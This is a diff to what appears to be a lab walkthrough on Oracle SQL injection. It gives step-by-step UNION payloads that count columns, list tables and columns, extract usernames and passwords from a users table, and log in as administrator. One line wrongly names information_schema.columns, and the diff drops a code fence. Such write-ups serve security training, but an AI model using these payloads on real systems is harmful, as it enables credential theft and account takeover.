@@ -26,8 +26,26 @@ The objective is to enumerate schema information using Oracle-specific system ta
 
 ### 1. Determine the number of columns
 Instead of `null` values (used in non-Oracle DBs), Oracle needs strings plus the `dual` table:
-```sql
 ' UNION SELECT 'abc', 'def' FROM dual--
+ If successful → confirms 2 columns in the original query.
+### 2. Enumerate all available tables
+Use all_tables to discover schema contents:
+- ' UNION SELECT table_name, 'def' FROM all_tables--
+Scan the output for a table of interest, usually named USERS.
+### 3. Enumerate columns of the chosen table
+Query information_schema.columns for the users table:
+' UNION SELECT column_name, 'def' 
+  FROM all_tab_columns 
+  WHERE table_name='USERS'--
+##### Typical results:
+- username
+- password
+### 4. Extract usernames and passwords
+' UNION SELECT username, password FROM users--
+Among the results, locate the administrator credentials.
+### 5. Use credentials to log in
+Take the extracted administrator username and password, then authenticate through the application’s login page.
+
 
 
 
